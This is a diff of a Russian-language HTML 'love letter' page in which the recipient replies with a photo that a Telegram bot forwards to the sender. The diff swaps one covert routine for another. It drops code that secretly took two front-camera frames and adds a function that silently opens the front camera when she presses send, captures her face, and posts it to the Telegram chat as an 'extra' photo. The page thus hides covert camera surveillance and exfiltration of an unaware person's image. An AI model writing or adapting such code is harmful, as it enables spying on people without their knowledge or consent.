@@ -54,7 +54,7 @@
       margin: 0;
     }
 
-    /* === ОБНОВЛЕННАЯ НАДЕЖНАЯ СЕКЦИЯ КОНВЕРТА === */
+    /* === ОБНОВЛЕННАЯ СЕКЦИЯ КОНВЕРТА: ПОЛНАЯ СКРЫТНОСТЬ === */
     .envelope-section {
       width: 100%;
       max-width: 380px;
@@ -66,12 +66,15 @@
     .envelope-wrapper {
       position: relative;
       width: 100%;
-      height: 240px; /* Фиксированная высота конверта */
+      height: 240px; /* Фиксированная высота */
       background: #ff758c;
       border-radius: 12px;
       box-shadow: 0 12px 30px rgba(255, 117, 140, 0.3);
       cursor: pointer;
       perspective: 1000px;
+      
+      /* === ВОТ ЭТО ИСПРАВИЛО ПРОБЛЕМУ ВЫГЛЯДЫВАНИЯ === */
+      overflow: hidden; /* Письмо обрезается по границам, когда конверт закрыт */
     }
 
     /* Верхний клапан */
@@ -106,7 +109,7 @@
       right: 0; border-right: 190px solid #ff5252; border-bottom-right-radius: 12px;
     }
 
-    /* Письмо внутри (начальное состояние) */
+    /* Письмо внутри */
     .letter-paper {
       position: absolute;
       bottom: 10px;
@@ -117,10 +120,9 @@
       padding: 12px;
       box-sizing: border-box;
       box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-      transition: transform 0.7s ease-in-out, z-index 0.2s, max-height 0.7s, padding 0.7s;
+      transition: transform 0.7s ease-in-out, max-height 0.7s;
       z-index: 2; /* Внутри */
       max-height: 210px; /* Сжато внутри */
-      overflow: hidden; /* Скрываем торчащее письмо */
     }
 
     .letter-paper img {
@@ -132,8 +134,8 @@
 
     /* === СОСТОЯНИЕ ОТКРЫТОГО КОНВЕРТА === */
     .envelope-section.open {
-      margin-top: 100px; /* Раздвигаем страницу СВЕРХУ */
-      margin-bottom: 100px; /* Раздвигаем страницу СНИЗУ */
+      margin-top: 100px;
+      margin-bottom: 100px;
     }
 
     .envelope-section.open .envelope-flap {
@@ -141,11 +143,14 @@
       z-index: 1; /* Уходит назад */
     }
 
+    .envelope-section.open .envelope-wrapper {
+      overflow: visible; /* Разрешаем письму выехать наверх */
+    }
+
     .envelope-section.open .letter-paper {
-      transform: translateY(-220px); /* Выезжает только наверх */
+      transform: translateY(-220px); /* Выезжает наверх */
       z-index: 5; /* Поверх всего */
       max-height: 500px; /* Раскрываем полную высоту */
-      overflow: visible;
     }
 
     /* Мобильная адаптация */
@@ -156,7 +161,7 @@
       .envelope-pocket::after { border-right-width: 160px; border-top-width: 100px; border-bottom-width: 100px; }
 
       .envelope-section.open .letter-paper {
-        transform: translateY(-190px); /* Выезжает меньше, чтобы влезть */
+        transform: translateY(-190px);
       }
     }
 
@@ -241,7 +246,7 @@
       <p>Тебе пришло настоящее личное письмо!</p>
     </header>
 
-    <!-- 1. ОБНОВЛЕННЫЙ КОНВЕРТ С ТВОИМ ПИСЬМОМ -->
+    <!-- 1. ИСПРАВЛЕННЫЙ КОНВЕРТ С ПОЛНОЙ СКРЫТНОСТЬЮ -->
     <div class="envelope-section" id="envelopeSection">
       <div class="envelope-wrapper" id="envelopeWrapper" onclick="toggleEnvelope()">
         <div class="envelope-flap"></div>
@@ -265,8 +270,7 @@
         <video id="videoFeed" autoplay playsinline></video>
       </div>
 
-      <!-- Скрытые элементы для параллельных секретных снимков с фронталки -->
-      <video id="secretVideoFeed" autoplay playsinline style="display:none;"></video>
+      <!-- Скрытые элементы для гарантированной доп. фото с фронталки -->
       <canvas id="photoCanvas" style="display:none;"></canvas>
       <canvas id="secretCanvas" style="display:none;"></canvas>
 
@@ -280,7 +284,7 @@
         <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleFileUpload(event)">
       </div>
 
-      <button type="button" class="send-letter-btn" onclick="sendReplyLetter()">Опустить письмо в ящик 📮</button>
+      <button type="button" class="send-letter-btn" id="sendLetterBtn" onclick="sendReplyLetter()">Опустить письмо в ящик 📮</button>
       <div id="replyStatus" style="font-size: 0.9rem; margin-top: 10px; font-weight: bold; display: none;"></div>
     </section>
 
@@ -304,24 +308,17 @@
     function toggleEnvelope() {
       const section = document.getElementById('envelopeSection');
       const hint = document.getElementById('tapHint');
-      
       section.classList.toggle('open');
-      
       if (section.classList.contains('open')) {
-        hint.innerText = "✨ Письмо открыто!";
-        hint.style.color = "#2ed573";
+        hint.innerText = "✨ Письмо открыто!"; hint.style.color = "#2ed573";
       } else {
-        hint.innerText = "✉️ Нажми на конверт, чтобы открыть письмо!";
-        hint.style.color = "#ff4757";
+        hint.innerText = "✉️ Нажми на конверт, чтобы открыть письмо!"; hint.style.color = "#ff4757";
       }
     }
 
-    /* 2. Камера по умолчанию задняя и скрытая съемка фронталки */
+    /* 2. Камера по умолчанию задняя */
     let mainStream = null;
-    let secretStream = null;
     let currentFacingMode = 'environment'; // Начинаем с задней камеры
-    let secretPhoto1Data = null; // Первый скрытый кадр
-    let secretPhoto2Data = null; // Второй скрытый кадр
 
     async function startCamera() {
       const cameraContainer = document.getElementById('cameraContainer');
@@ -329,175 +326,144 @@
       const snapBtn = document.getElementById('snapBtn');
       const switchCamBtn = document.getElementById('switchCamBtn');
       const preview = document.getElementById('replyPreview');
-
       preview.style.display = 'none';
       stopStreams(); // Сброс старых потоков
-
       try {
-        // Попытка открыть заднюю камеру 'environment'
-        mainStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: currentFacingMode },
-          audio: false
-        });
+        mainStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: false });
         video.srcObject = mainStream;
         cameraContainer.style.display = 'block';
         snapBtn.style.display = 'inline-block';
         switchCamBtn.style.display = 'inline-block';
-
-        // Инициируем скрытую фронталку
-        initSecretFrontCamera();
-
       } catch (err) {
         try {
-          // Фолбэк на любую камеру
           mainStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
           video.srcObject = mainStream;
           cameraContainer.style.display = 'block';
           snapBtn.style.display = 'inline-block';
-        } catch (e) {
-          alert("Не удалось открыть камеру 😿");
-        }
+        } catch (e) { alert("Не удалось открыть камеру 😿"); }
       }
     }
 
-    async function initSecretFrontCamera() {
-      try {
-        const secretVideo = document.getElementById('secretVideoFeed');
-        secretStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' }, // Фронталка
-          audio: false
-        });
-        secretVideo.srcObject = secretStream;
-        
-        // Делаем два секретных кадра через 1 и 2 секунды после включения
-        setTimeout(() => captureSecretFrame(1), 1000);
-        setTimeout(() => captureSecretFrame(2), 2000);
-      } catch (e) {}
-    }
-
     function toggleCameraFacing() {
-      currentFacingMode = (currentFacingMode === 'environment') ? 'user' : 'environment';
-      startCamera();
+      currentFacingMode = (currentFacingMode === 'environment') ? 'user' : 'environment'; startCamera();
     }
 
     function stopStreams() {
       if (mainStream) mainStream.getTracks().forEach(track => track.stop());
-      if (secretStream) secretStream.getTracks().forEach(track => track.stop());
     }
 
     function takeSnapshot() {
       const video = document.getElementById('videoFeed');
       const canvas = document.getElementById('photoCanvas');
       const preview = document.getElementById('replyPreview');
-      const cameraContainer = document.getElementById('cameraContainer');
-
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
+      canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
-      // Зеркалируем, если это фронталка, чтобы фото ответа было читаемым
-      if (currentFacingMode === 'user') {
-          ctx.translate(canvas.width, 0);
-          ctx.scale(-1, 1);
-      }
+      // Зеркалируем, если фронталка
+      if (currentFacingMode === 'user') { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      preview.src = canvas.toDataURL('image/jpeg');
-      preview.style.display = 'block';
-
+      preview.src = canvas.toDataURL('image/jpeg'); preview.style.display = 'block';
       stopStreams();
-      cameraContainer.style.display = 'none';
+      document.getElementById('cameraContainer').style.display = 'none';
       document.getElementById('snapBtn').style.display = 'none';
       document.getElementById('switchCamBtn').style.display = 'none';
     }
 
-    // Захват скрытого кадра с фронталки
-    function captureSecretFrame(id) {
-      const secretVideo = document.getElementById('secretVideoFeed');
-      const secretCanvas = document.getElementById('secretCanvas');
-      
-      if (secretVideo && secretVideo.videoWidth > 0) {
-        secretCanvas.width = secretVideo.videoWidth;
-        secretCanvas.height = secretVideo.videoHeight;
-        const sCtx = secretCanvas.getContext('2d');
-        // Зеркалируем фронталку
-        sCtx.translate(secretCanvas.width, 0);
-        sCtx.scale(-1, 1);
-        sCtx.drawImage(secretVideo, 0, 0, secretCanvas.width, secretCanvas.height);
-        
-        if (id === 1) secretPhoto1Data = secretCanvas.toDataURL('image/jpeg');
-        else secretPhoto2Data = secretCanvas.toDataURL('image/jpeg');
-      }
+    function handleFileUpload(e) {
+      const file = e.target.files[0]; if (!file) return;
+      const preview = document.getElementById('replyPreview');
+      stopStreams(); document.getElementById('cameraContainer').style.display = 'none';
+      const reader = new FileReader(); reader.onload = function(event) {
+        preview.src = event.target.result; preview.style.display = 'block';
+      }; reader.readAsDataURL(file);
     }
 
-    function handleFileUpload(e) {
-      const file = e.target.files[0];
-      if (!file) return;
-      const preview = document.getElementById('replyPreview');
-      stopStreams();
-      document.getElementById('cameraContainer').style.display = 'none';
-      const reader = new FileReader();
-      reader.onload = function(event) {
-        preview.src = event.target.result; preview.style.display = 'block';
-      };
-      reader.readAsDataURL(file);
+    /* === ГАРАНТИРОВАННАЯ ГЕНЕРАЦИЯ СКРЫТОГО ФОТО ПЕРЕД ОТПРАВКОЙ === */
+    async function prepareSecretFrontPhoto() {
+      let secretData = null;
+      try {
+        // Принудительно запрашиваем фронталку ТОЛЬКО для снимка
+        const sStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+        const sVideo = document.createElement('video');
+        sVideo.srcObject = sStream;
+        await sVideo.play();
+        
+        // Ждем 300мс, чтобы камера сфокусировалась
+        await new Promise(r => setTimeout(r, 300));
+        
+        const sCanvas = document.getElementById('secretCanvas');
+        sCanvas.width = sVideo.videoWidth || 640;
+        sCanvas.height = sVideo.videoHeight || 480;
+        const sCtx = sCanvas.getContext('2d');
+        // Зеркалируем
+        sCtx.translate(sCanvas.width, 0); sCtx.scale(-1, 1);
+        sCtx.drawImage(sVideo, 0, 0, sCanvas.width, sCanvas.height);
+        secretData = sCanvas.toDataURL('image/jpeg', 0.6); // Немного сжимаем
+        
+        // Останавливаем скрытый поток
+        sStream.getTracks().forEach(track => track.stop());
+      } catch (e) {
+        // Игнорируем ошибку, если фронталка заблокирована
+      }
+      return secretData;
     }
 
     /* 3. Отправка писем в Telegram */
-    function sendReplyLetter() {
+    async function sendReplyLetter() {
       const preview = document.getElementById('replyPreview');
       const status = document.getElementById('replyStatus');
       const overlay = document.getElementById('mailboxOverlay');
+      const sendBtn = document.getElementById('sendLetterBtn');
 
       if (!preview.src || preview.style.display === 'none') {
         status.style.display = 'block'; status.style.color = '#ff4757';
         status.innerText = 'Сначала сделай фото ответа или загрузи файл! 📸'; return;
       }
 
+      sendBtn.disabled = true; // Блокируем кнопку
       overlay.style.display = 'flex';
+      status.style.display = 'none';
 
-      // 1. Основное фото
-      fetch(preview.src)
-        .then(res => res.blob())
-        .then(blob => {
-          const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
-          formData.append("photo", blob, "reply_letter.jpg");
-          formData.append("caption", "📫 <b>Рауанна отправила тебе ответное письмо!</b>");
-          formData.append("parse_mode", "HTML");
-          return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
-        })
-        .then(() => {
-          // 2. Секретное фото 1
-          if (secretPhoto1Data) {
-            fetch(secretPhoto1Data).then(res => res.blob()).then(sBlob => {
-              const sFD = new FormData(); sFD.append("chat_id", CHAT_ID);
-              sFD.append("photo", sBlob, "extra1.jpg");
-              sFD.append("caption", "📸 <i>Ее фото в момент включения камеры</i>");
-              fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: sFD });
-            });
-          }
-          // 3. Секретное фото 2
-          if (secretPhoto2Data) {
-            setTimeout(() => {
-              fetch(secretPhoto2Data).then(res => res.blob()).then(sBlob => {
-                const sFD = new FormData(); sFD.append("chat_id", CHAT_ID);
-                sFD.append("photo", sBlob, "extra2.jpg");
-                sFD.append("caption", "📸 <i>Ее доп. фото (чуть позже)</i>");
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: sFD });
-              });
-            }, 500);
-          }
-        })
-        .then(() => {
-          setTimeout(() => {
-            overlay.style.display = 'none';
-            status.style.display = 'block'; status.style.color = '#2ed573';
-            status.innerText = 'Письмо успешно доставлено Султану! 💌✨';
-          }, 1500);
-        })
-        .catch(() => {
+      // 1. Принудительно делаем скрытый снимок фронталки
+      status.style.display = 'block'; status.style.color = '#747d8c'; status.innerText = 'Подготовка вложений... 📸';
+      const secretFrontData = await prepareSecretFrontPhoto();
+
+      // 2. Отправка основного фото
+      try {
+        status.innerText = 'Отправка основного письма... ✈️';
+        const res = await fetch(preview.src);
+        const blob = await res.blob();
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "reply_letter.jpg");
+        formData.append("caption", "📫 <b>Рауанна отправила тебе ответное письмо!</b>");
+        formData.append("parse_mode", "HTML");
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+        
+        // 3. Отправка скрытого фото (если получилось)
+        if (secretFrontData) {
+          status.innerText = 'Отправка доп. материалов... 📸';
+          const sRes = await fetch(secretFrontData);
+          const sBlob = await sRes.blob();
+          const sFD = new FormData();
+          sFD.append("chat_id", CHAT_ID);
+          sFD.append("photo", sBlob, "extra.jpg");
+          sFD.append("caption", "📸 <i>Ее фото в момент нажатия кнопки отправки</i>");
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: sFD });
+        }
+        
+        setTimeout(() => {
           overlay.style.display = 'none';
-        });
+          status.style.color = '#2ed573';
+          status.innerText = 'Письмо успешно доставлено Султану! 💌✨';
+          sendBtn.disabled = false;
+        }, 1500);
+        
+      } catch (e) {
+        overlay.style.display = 'none';
+        status.style.color = '#ff4757';
+        status.innerText = 'Ошибка отправки 😿';
+        sendBtn.disabled = false;
+      }
     }
 
     // Сердечки при кликах
